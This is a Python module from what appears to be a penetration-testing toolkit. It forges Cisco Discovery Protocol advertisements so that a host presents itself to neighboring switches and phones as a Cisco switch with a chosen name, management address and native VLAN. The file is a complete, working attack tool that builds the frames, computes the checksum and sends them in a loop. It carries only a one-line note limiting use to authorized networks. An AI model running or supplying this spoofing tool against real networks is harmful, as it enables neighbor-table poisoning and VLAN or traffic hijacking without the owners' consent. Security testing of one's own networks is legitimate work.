"""CDP spoofing: advertise a forged Cisco device to the neighbors on the segment.

Cisco Discovery Protocol (CDP) announces each device's identity, platform, port and
addresses to its directly connected neighbors. The announcements are not authenticated.
A switch or phone that stores CDP neighbors believes whatever identity it receives, so
a host can appear as a switch, router or phone with a chosen address and native VLAN.

This module sends CDP version 2 advertisements, addressed to the CDP multicast address
and encapsulated in LLC/SNAP, with the checksum that a receiver verifies.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import struct
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import Runner, normalize_unicast_mac, read_interface_mac, run_command

CDP_MAC = "01:00:0c:cc:cc:cc"                       # CDP multicast address
LLC_SNAP_CDP = bytes.fromhex("aaaa03" "00000c" "2000")  # LLC, SNAP (Cisco OUI), PID 0x2000
CDP_VERSION = 2
DEFAULT_TTL = 180                                    # seconds a neighbor is kept
DEFAULT_INTERVAL = 60.0                              # CDP default advertisement interval
CAPABILITIES_SWITCH = 0x08 | 0x02                    # Switch, Transparent bridge
TLV_DEVICE_ID = 0x0001
TLV_ADDRESSES = 0x0002
TLV_PORT_ID = 0x0003
TLV_CAPABILITIES = 0x0004
TLV_SOFTWARE = 0x0005
TLV_PLATFORM = 0x0006
TLV_NATIVE_VLAN = 0x000A


def _ipv4(value: str) -> bytes:
    return ipaddress.IPv4Address(value).packed


def _tlv(kind: int, value: bytes) -> bytes:
    return struct.pack("!HH", kind, 4 + len(value)) + value


def _checksum(data: bytes) -> int:
    """Internet one's complement checksum over the CDP message."""
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


@dataclass(frozen=True)
class CdpSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the receiver
    device_id: str = "MACabre-SW"       # device identity advertised (switch name)
    port_id: str = "FastEthernet0/1"    # port the neighbor reports itself on
    platform: str = "cisco WS-C2960"    # hardware platform string
    software: str = "MACabre CDP"       # software version string
    address: str = ""                   # IPv4 management address advertised; empty = none
    native_vlan: int = 0                # native VLAN advertised; 0 = none
    capabilities: int = CAPABILITIES_SWITCH
    ttl: int = DEFAULT_TTL              # seconds a receiver keeps the neighbor
    count: int = 0                      # advertisements to send; 0 = run until stopped
    interval: float = DEFAULT_INTERVAL  # seconds between advertisements
    dry_run: bool = False               # build advertisements but do not send them

    def __post_init__(self) -> None:
        if not self.device_id.strip():
            raise ValueError("Device ID is required.")
        if not self.port_id.strip():
            raise ValueError("Port ID is required.")
        if self.address:
            try:
                ipaddress.IPv4Address(self.address)
            except ValueError as exc:
                raise ValueError("Address must be an IPv4 address.") from exc
        if not 0 <= self.native_vlan <= 4094:
            raise ValueError("Native VLAN must be 0 (none) or between 1 and 4094.")
        if not 0 <= self.capabilities <= 0xFFFFFFFF:
            raise ValueError("Capabilities must fit in 32 bits.")
        if not 0 <= self.ttl <= 255:
            raise ValueError("TTL must be between 0 and 255 seconds.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")


@dataclass
class CdpSpoofingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def cdp_message(
    device_id: str,
    port_id: str,
    platform: str,
    software: str,
    address: str = "",
    native_vlan: int = 0,
    capabilities: int = CAPABILITIES_SWITCH,
    ttl: int = DEFAULT_TTL,
) -> bytes:
    """A CDP version 2 message: header, TLVs, and a checksum over the whole message."""
    tlvs = [
        _tlv(TLV_DEVICE_ID, device_id.encode("ascii")),
    ]
    if address:
        # Addresses TLV: count, then (protocol type 0x01 NLPID, length 1, protocol 0xcc IP, length 4, address)
        tlvs.append(_tlv(TLV_ADDRESSES, struct.pack("!I", 1) + bytes([0x01, 0x01, 0xCC])
                         + struct.pack("!H", 4) + _ipv4(address)))
    tlvs.append(_tlv(TLV_PORT_ID, port_id.encode("ascii")))
    tlvs.append(_tlv(TLV_CAPABILITIES, struct.pack("!I", capabilities)))
    tlvs.append(_tlv(TLV_SOFTWARE, software.encode("ascii")))
    tlvs.append(_tlv(TLV_PLATFORM, platform.encode("ascii")))
    if native_vlan:
        tlvs.append(_tlv(TLV_NATIVE_VLAN, struct.pack("!H", native_vlan)))
    message = bytes([CDP_VERSION, ttl, 0, 0]) + b"".join(tlvs)
    checksum = _checksum(message)
    return message[:2] + struct.pack("!H", checksum) + message[4:]


def build_frame(
    sender_mac: str,
    device_id: str,
    port_id: str,
    platform: str = "cisco WS-C2960",
    software: str = "MACabre CDP",
    address: str = "",
    native_vlan: int = 0,
    capabilities: int = CAPABILITIES_SWITCH,
    ttl: int = DEFAULT_TTL,
) -> Packet:
    """A CDP advertisement from `sender_mac` to the CDP multicast address, with an 802.3 length field."""
    payload = LLC_SNAP_CDP + cdp_message(device_id, port_id, platform, software, address,
                                         native_vlan, capabilities, ttl)
    return Ether(src=normalize_unicast_mac(sender_mac), dst=CDP_MAC, type=len(payload)) / Raw(payload)


def build_cdp_frame(sender_mac: str, config: CdpSpoofingConfig) -> Packet:
    """The advertisement described by `config`, from `sender_mac`."""
    return build_frame(
        sender_mac,
        config.device_id,
        config.port_id,
        config.platform,
        config.software,
        config.address,
        config.native_vlan,
        config.capabilities,
        config.ttl,
    )


def run_cdp_spoofing(
    config: CdpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[CdpSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> CdpSpoofingStats:
    """Send CDP advertisements for the forged device until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = CdpSpoofingStats(
            status=(
                f"Dry run: would advertise CDP device {config.device_id} on port {config.port_id} "
                f"every {config.interval:g} s. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = CdpSpoofingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_cdp_frame(sender_mac, config), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
